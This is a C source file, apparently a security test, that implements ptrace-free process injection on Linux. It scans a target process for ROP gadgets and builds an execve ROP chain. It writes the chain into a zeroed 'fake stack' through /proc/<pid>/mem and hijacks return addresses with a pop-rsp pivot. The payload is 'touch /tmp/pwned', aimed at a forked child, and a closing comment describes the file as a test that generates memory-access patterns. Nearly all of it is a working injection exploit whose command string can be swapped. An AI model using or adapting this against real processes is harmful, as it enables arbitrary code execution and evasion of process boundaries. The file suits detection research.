#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>

char* COMMAND = "/bin/touch /tmp/pwned";

#define MAX_LOOPS 100
#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)

typedef struct {
    const uint8_t  *bytes;
    size_t          len;
    uint64_t        addr;
} Gadget;

pid_t create_victim_child_process() {
    pid_t pid = fork();
    if (pid < 0) {
        return 0;
    } else if (pid == 0) {
        sleep(2);
        exit(0);
    }
    usleep(200000);
    return pid;
}

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "/proc/%d/mem", pid);

    FILE *file = fopen(filepath, "r");
    if (!file) return -1;

    if (fseeko(file, (off_t)address, SEEK_SET) != 0) {
        fclose(file);
        return -2;
    }

    if (fread(buf, 1, len, file) != len) {
        fclose(file);
        return -3;
    }

    fclose(file);
    return 0;
}

void print_mem(unsigned char* buffer, long size) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%06zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", buffer[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

long get_reg(pid_t pid, const char* reg) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/syscall", pid);

    char buffer[256];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    //try to read registers until they become available
    ssize_t bytesRead;
    int i=0;
    while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        if (strncmp(buffer, "running", 7) != 0) break;

        i++;
        usleep(1000); 
    }

    close(fd);
    if (bytesRead <= 0) return -1;
    buffer[bytesRead] = '\0';

    long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
    int n = sscanf(buffer, "%ld %lx %lx %lx %lx %lx %lx %lx %lx",
                &syscall, &rdi, &rsi, &rdx, &r10, &r8, &r9, &rsp, &rip);

    if (n < 9) return -1;

    if (strcmp(reg, "syscall") == 0) return syscall;
    if (strcmp(reg, "rdi") == 0)     return rdi;
    if (strcmp(reg, "rsi") == 0)     return rsi;
    if (strcmp(reg, "rdx") == 0)     return rdx;
    if (strcmp(reg, "r10") == 0)     return r10;
    if (strcmp(reg, "r8") == 0)      return r8;
    if (strcmp(reg, "r9") == 0)      return r9;
    if (strcmp(reg, "rsp") == 0)     return rsp;
    if (strcmp(reg, "rip") == 0)     return rip;

    return -1;
}

long find_memory_region(long pid, size_t required_len, const char *target_perms) {
    char maps_file_name[64];
    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);

    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) return -1;

    char *line = NULL;
    size_t len = 0;
    long found_address = -1;

    while (getline(&line, &len, maps_file) != -1) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            
            // has this region all the permissions required?
            int has_all_perms = 1;
            for (int i = 0; target_perms[i] != '\0'; i++) {
                if (strchr(perms, target_perms[i]) == NULL) {
                    has_all_perms = 0;
                    break;
                }
            }
            
            if (has_all_perms) {
                // is this region, with the correct permission, big enought?
                size_t region_size = (size_t)(end - start);
                if (region_size >= required_len) {
                    found_address = start;
                    break;
                }
            }
        }
    }

    free(line);
    fclose(maps_file);
    return found_address;
}

long find_zeroed_writable_cave(pid_t pid, size_t required_len) {
    char maps_path[256], mem_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);
    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    char line[512];
    long found_addr = -1;
    unsigned char *zeros = calloc(1, required_len);

    while (fgets(line, sizeof(line), maps_file)) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (perms[1] != 'w') continue;

        size_t size = end - start;
        if (size < required_len) continue;
        if (size > 1024 * 1024 * 5) size = 1024 * 1024 * 5;

        unsigned char *buffer = malloc(size);
        if (!buffer) continue;

        if (pread(mem_fd, buffer, size, start) > 0) {
            unsigned char *match = memmem(buffer, size, zeros, required_len);
            if (match) {
                found_addr = start + (match - buffer);
                free(buffer);
                break;
            }
        }
        free(buffer);
    }
    free(zeros);
    fclose(maps_file);
    close(mem_fd);
    return found_addr;
}

char** cmd_to_argv(const char* raw_cmd, int *out_argc) {
    if (!raw_cmd) return NULL;

    int argc = 1;
    for (const char *p = raw_cmd; *p != '\0'; p++) {
        if (*p == ' ') {
            argc++;
        }
    }

    char *cmd_copy = strdup(raw_cmd);
    if (!cmd_copy) return NULL;

    char **argv = calloc(argc + 1, sizeof(char*));
    if (!argv) return NULL;

    int cont = 0;
    char *token = strtok(cmd_copy, " ");
    
    while (token != NULL) {
        argv[cont++] = strdup(token); 
        token = strtok(NULL, " ");
    }
    argv[cont] = NULL;

    free(cmd_copy);
    *out_argc = cont;
    return argv;
}

long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
    char maps_path[256];
    char mem_path[256];
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);

    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    size_t max_gadget_len = 0;
    for (int i = 0; i < num_gadgets; i++) {
        if (gadgets[i].len > max_gadget_len) {
            max_gadget_len = gadgets[i].len;
        }
    }
    size_t overlap = max_gadget_len - 1;
    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(maps_file);
        close(mem_fd);
        return -1;
    }

    char line[512];
    long found = 0;

    // read the memory
    while (fgets(line, sizeof(line), maps_file)) {
        long start, end;
        char perms[5];
        
        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3)
            continue;
        
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;

        long current_addr = start;
        while (current_addr < end) {
            size_t bytes_to_read = end - current_addr;
            if (bytes_to_read > CHUNK_SIZE) {
                bytes_to_read = CHUNK_SIZE;
            }

            ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
            if (bytes_read <= 0) break;

            for (int i = 0; i < num_gadgets; i++) {
                if (gadgets[i].addr != 0) continue;
                
                unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
                if (match) {
                    gadgets[i].addr = current_addr + (match - buffer);
                    found++;
                }
            }

            if (found == num_gadgets) {
                free(buffer);
                fclose(maps_file);
                close(mem_fd);
                return found;
            }

            if (current_addr + bytes_read < end) {
                current_addr += (bytes_read - overlap);
            } else
                break; 
        }
    }

    free(buffer);
    fclose(maps_file);
    close(mem_fd);
    return found;
}

int find_pop_rdx_variant(pid_t pid, uint64_t *out_addr, int *out_extra_pops) {
    static const struct {
        const uint8_t *bytes;
        size_t         len;
        int            extra_pops;
        const char    *desc;
    } variants[] = {
        { (const uint8_t*)"\x5a\xc3",         2, 0, "pop rdx; ret" },
        { (const uint8_t*)"\x5a\x5b\xc3",     3, 1, "pop rdx; pop rbx; ret" },
        { (const uint8_t*)"\x5a\x5d\xc3",     3, 1, "pop rdx; pop rbp; ret" },
        { (const uint8_t*)"\x5a\x5e\xc3",     3, 1, "pop rdx; pop rsi; ret" },
        { (const uint8_t*)"\x5a\x5f\xc3",     3, 1, "pop rdx; pop rdi; ret" },
        { (const uint8_t*)"\x5a\x41\x5c\xc3", 4, 1, "pop rdx; pop r12; ret" },
        { (const uint8_t*)"\x5a\x41\x5d\xc3", 4, 1, "pop rdx; pop r13; ret" },
        { (const uint8_t*)"\x5a\x41\x5e\xc3", 4, 1, "pop rdx; pop r14; ret" },
        { (const uint8_t*)"\x5a\x41\x5f\xc3", 4, 1, "pop rdx; pop r15; ret" },
    };
    int n = sizeof(variants) / sizeof(variants[0]);

    Gadget candidates[n];
    for (int i = 0; i < n; i++) {
        candidates[i].bytes = variants[i].bytes;
        candidates[i].len   = variants[i].len;
        candidates[i].addr  = 0;
    }

    find_gadgets(pid, candidates, n);

    for (int i = 0; i < n; i++) {
        if (candidates[i].addr != 0) {
            *out_addr       = candidates[i].addr;
            *out_extra_pops = variants[i].extra_pops;
            printf("[+] %-26s @ 0x%lx  (dummies=%d)\n",
                   variants[i].desc, *out_addr, *out_extra_pops);
            return 0;
        }
    }
    return -1;
}

int overwrite_possible_ret_addrs(pid_t pid, long rsp, unsigned char *buffer, size_t len) {
    if (!buffer || len == 0) return -1;

    char maps_path[256], mem_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path,  sizeof(mem_path),  "/proc/%d/mem",  pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) return -1;

    long region_starts[64];
    long region_ends[64];
    int n_regions = 0;
    char *line = NULL;
    size_t line_len = 0;

    // gathering pointers to exec region
    while (getline(&line, &line_len, maps_file) != -1 && n_regions < 64) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (strchr(perms, 'x') == NULL) continue;
        region_starts[n_regions] = start;
        region_ends[n_regions]   = end;
        n_regions++;
    }
    free(line);
    fclose(maps_file);

    if (n_regions == 0) return -1;

    uint64_t stack_dump[128];
    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
    close(fd);
    if (bytes_read <= 0) return -1;

    int num_elements = bytes_read / sizeof(uint64_t);

    // check exec region and overwriting
    int overwritten = 0;
    for (int i = 0; i < num_elements; i++) {
        uint64_t current_val = stack_dump[i];
        if (current_val < 0x400000) continue; // skip non-pointer junk

        // exec memory check
        int in_exec = 0;
        for (int r = 0; r < n_regions; r++) {
            if (current_val >= (uint64_t)region_starts[r] && current_val < (uint64_t)region_ends[r]) {
                in_exec = 1;
                break;
            }
        }
        if (!in_exec) continue;

        long slot_addr = rsp + (long)i * sizeof(uint64_t);
        ssize_t w = write_in_mem(slot_addr, pid, buffer, len);
        if (w != (ssize_t)len) {
            fprintf(stderr, "[!] Failed overwrite at rsp+0x%lx\n", (long)i * sizeof(uint64_t));
            continue;
        }
        overwritten++;
    }
    return overwritten;
}

uint64_t* build_rop_chain_exec_cmd(pid_t pid, int* out_rop_chain_size, char* const cmd_argv[], int cmd_argc) {
    Gadget gadgets[] = {
        { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
        { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
        { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
        { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
        { (uint8_t*)"\x48\x89\x07\xc3", 4, 0 }, // mov [rdi], rax; ret
    };
    int n = sizeof(gadgets) / sizeof(gadgets[0]);

    int found = find_gadgets(pid, gadgets, n);
    if (found < n) {
        fprintf(stderr, "[-] Not all gadgets found (%d/%d)\n", found, n);
        return NULL;
    }

    uint64_t pop_rdi_ret        = gadgets[0].addr;
    uint64_t pop_rsi_ret        = gadgets[1].addr;
    uint64_t pop_rax_ret        = gadgets[2].addr;
    uint64_t syscall_ret        = gadgets[3].addr;
    uint64_t mov_mem_rdi_rax_ret = gadgets[4].addr;

    uint64_t pop_rdx_gadget = 0;
    int      pop_rdx_extra  = 0;
    if (find_pop_rdx_variant(pid, &pop_rdx_gadget, &pop_rdx_extra) != 0) {
        fprintf(stderr, "[-] No pop rdx variant found\n");
        return NULL;
    }

    printf("[+] All gadgets found:\n");
    printf("    pop rdi; ret        -> 0x%lx\n", pop_rdi_ret);
    printf("    pop rsi; ret        -> 0x%lx\n", pop_rsi_ret);
    printf("    pop rax; ret        -> 0x%lx\n", pop_rax_ret);
    printf("    syscall; ret        -> 0x%lx\n", syscall_ret);
    printf("    mov [rdi], rax; ret -> 0x%lx\n", mov_mem_rdi_rax_ret);

    int argc = cmd_argc;

    int string_lens[argc];
    int num_chunks = 0;
    for(int cont = 0; cont < argc; cont++) {
        string_lens[cont] = strlen(cmd_argv[cont]);
        num_chunks += ((string_lens[cont] + 1) + 7) / 8; // each argument is divided in chunks of max 8 bytes
    }
    int bytes_to_write = (num_chunks * 8) + (argc + 1) * 8; // arguments + pointers to them (argv)

    long writable_region = find_memory_region(pid, bytes_to_write, "w");
    if(writable_region == -1) return NULL;
    writable_region = (writable_region + 7) & ~7; // alignment
    printf("[+] Writable region for argv data: 0x%lx (size: %d bytes)\n", writable_region, bytes_to_write);

    // rop_chain allocation - account for pop_rdx_extra dummies
    int rop_chain_len = num_chunks * 5 +                // 5 gadgets to write 8 bytes
                        (argc + 1) * 5 +                // 5 gadgets per argv pointer + NULL terminator
                        9 + pop_rdx_extra + 5;          // execve (+dummies) + exit
    uint64_t *rop_chain = malloc(rop_chain_len * sizeof(uint64_t));
    if (rop_chain == NULL) return NULL;

    int i = 0;
    long temp_argv_addrs[argc];
    long current_offset = 0;

    // writing each argument in writable_region
    for(int s = 0; s < argc; s++) {
        int str_chunks = (string_lens[s] + 1 + 7) / 8;
        temp_argv_addrs[s] = writable_region + current_offset;
        
        for(int c = 0; c < str_chunks; c++) {
            uint64_t chunk_val = 0;
            size_t bytes_left = (string_lens[s] + 1) - (c * 8);
            size_t copy_size = bytes_left > 8 ? 8 : bytes_left;
            
            memcpy(&chunk_val, cmd_argv[s] + (c * 8), copy_size);
            
            rop_chain[i++] = pop_rdi_ret;
            rop_chain[i++] = writable_region + current_offset;
            rop_chain[i++] = pop_rax_ret;
            rop_chain[i++] = chunk_val;
            rop_chain[i++] = mov_mem_rdi_rax_ret;
            
            current_offset += 8;
        }
    }

    // write of argv array (pointers)
    long argv_array_addr = writable_region + current_offset;
    for(int s = 0; s < argc; s++) {
        rop_chain[i++] = pop_rdi_ret;
        rop_chain[i++] = argv_array_addr + (s * 8);
        rop_chain[i++] = pop_rax_ret;
        rop_chain[i++] = temp_argv_addrs[s];
        rop_chain[i++] = mov_mem_rdi_rax_ret;
    }
    // NULL terminator at the end
    long null_terminator_addr = argv_array_addr + (argc * 8);
    rop_chain[i++] = pop_rdi_ret;
    rop_chain[i++] = null_terminator_addr;
    rop_chain[i++] = pop_rax_ret;
    rop_chain[i++] = 0;
    rop_chain[i++] = mov_mem_rdi_rax_ret;

    // execve - now with pop rdx variant + dummies
    rop_chain[i++] = pop_rdi_ret;
    rop_chain[i++] = temp_argv_addrs[0];        // RDI = cmd_argv[0]
    rop_chain[i++] = pop_rsi_ret;
    rop_chain[i++] = argv_array_addr;           // RSI = argv
    rop_chain[i++] = pop_rdx_gadget;
    rop_chain[i++] = null_terminator_addr;      // RDX = envp (NULL pointer)
    for (int k = 0; k < pop_rdx_extra; k++) {
        rop_chain[i++] = 0xdeadbeefdeadbeefULL; // dummies eaten by the multi-pop
    }
    rop_chain[i++] = pop_rax_ret;
    rop_chain[i++] = 59;                        // RAX = 59 (execve)
    rop_chain[i++] = syscall_ret;

    // exit(0) - in case execve fails
    rop_chain[i++] = pop_rdi_ret;
    rop_chain[i++] = 0;
    rop_chain[i++] = pop_rax_ret;
    rop_chain[i++] = 60;                        // RAX = 60 (exit)
    rop_chain[i++] = syscall_ret;

    *out_rop_chain_size = rop_chain_len * sizeof(uint64_t);
    return rop_chain;
}


int main() { 
    pid_t pid = create_victim_child_process();
    if (pid == 0) {
        fprintf(stderr, "[-] Failed to fork\n");
        exit(1);
    }
    printf("[+] target PID: %d\n", pid);

    // Pivot gadget for the trampoline
    Gadget pivot_gadget = { (const uint8_t *)"\x5c\xc3", 2, 0 }; // pop rsp; ret
    if (find_gadgets(pid, &pivot_gadget, 1) != 1) {
        fprintf(stderr, "[-] Pivot gadget 'pop rsp; ret' not found\n");
        exit(1);
    }
    printf("[+] Pivot gadget found at: 0x%lx\n", pivot_gadget.addr);

    // create argv of the command to be injected
    int cmd_argc = 0;
    char **dyn_argv = cmd_to_argv(COMMAND, &cmd_argc);
    if (dyn_argv == NULL) {
        fprintf(stderr, "[-] Conversion to argv error\n");
        exit(1);
    }

    // construct a ROP chain to invoke execve(COMMAND) on the victim
    int rop_chain_size = 0;
    uint64_t *rop_chain = build_rop_chain_exec_cmd(pid, &rop_chain_size, dyn_argv, cmd_argc);
    for(int cont = 0; cont < cmd_argc; cont++) free(dyn_argv[cont]);
    free(dyn_argv);
    if (rop_chain == NULL) {
        fprintf(stderr, "[-] Error while building the ROP chain\n");
        exit(1);
    }
    printf("[+] ROP chain built (%d bytes)\n", rop_chain_size);

    // find a zero-filled writable region (the Fake Stack) and write the ROP chain there
    long fake_stack_addr = find_zeroed_writable_cave(pid, rop_chain_size);
    if (fake_stack_addr == -1) {
        fprintf(stderr, "[-] Zeroed writable region for fake stack not found\n");
        free(rop_chain);
        exit(1);
    }
    fake_stack_addr = (fake_stack_addr + 7) & ~7;
    printf("[+] Fake stack at: 0x%lx\n", fake_stack_addr);

    if (write_in_mem(fake_stack_addr, pid, (unsigned char *)rop_chain, rop_chain_size) != (ssize_t)rop_chain_size) {
        perror("write_in_mem rop_chain");
        free(rop_chain);
        exit(1);
    }
    printf("[+] ROP chain written at 0x%lx\n", fake_stack_addr);
    free(rop_chain);

    // gather RSP - target is in nanosleep, so /proc/<pid>/syscall returns valid registers
    long rsp = get_reg(pid, "rsp");
    if(rsp == -1) {
        fprintf(stderr, "[-] Stack pointer not found\n");
        exit(1);
    }
    printf("[+] Stack pointer: 0x%lx\n", rsp);

    // Build the 16-byte trampoline: pivot gadget + fake stack address
    uint64_t trampoline[2];
    trampoline[0] = pivot_gadget.addr;
    trampoline[1] = fake_stack_addr;

    // scan the stack and overwrite every executable-looking pointer with the trampoline
    int n = overwrite_possible_ret_addrs(pid, rsp, (unsigned char *)&trampoline, sizeof(trampoline));
    if (n <= 0) {
        fprintf(stderr, "[-] No executable pointers overwritten on stack\n");
        exit(1);
    }
    printf("[+] Overwrote %d executable pointer(s)\n", n);

    printf("[+] Injection finished\n");
    exit(0);
}

/**
 * The injector reads the victim's RSP register from /proc/<pid>/syscall and
 * builds a ROP chain that serializes an argv vector for execve into a
 * writable memory region, then issues execve to spawn an arbitrary command
 * with arguments (it doesn't support shell metacharacters e.g. '|', '>' or '>>').
 *
 * Instead of overwriting a single return address with the full ROP chain
 * (which risks catastrophic stack corruption when multiple return addresses
 * are clustered), the chain is placed into a separate zero-filled writable
 * region - the "Fake Stack". The injector then scans the victim's stack and
 * overwrites every executable-looking pointer (potential saved return
 * address) with a minimal 16-byte trampoline: { pivot_gadget, fake_stack_addr }
 * where pivot_gadget is a `pop rsp; ret` sequence.
 *
 * The moment the CPU executes any of the overwritten 'ret' instructions, the
 * stack pointer is pivoted to the fake stack and the execve ROP chain runs.
 *
 * The chain dynamically adapts to modern glibc constraints by selecting the
 * best available `pop rdx` variant (single or multi-pop) and padding it with
 * dummy values where required.
 *
 * Note: this test forks a child process to use as the injection target.
 * This allows the test to run on systems where ptrace_scope=1 (default on most
 * Linux distributions), where a process can only modify the memory of its own
 * descendants. The same /proc/<pid>/mem access patterns are generated
 * regardless of the relationship between injector and target.
 */
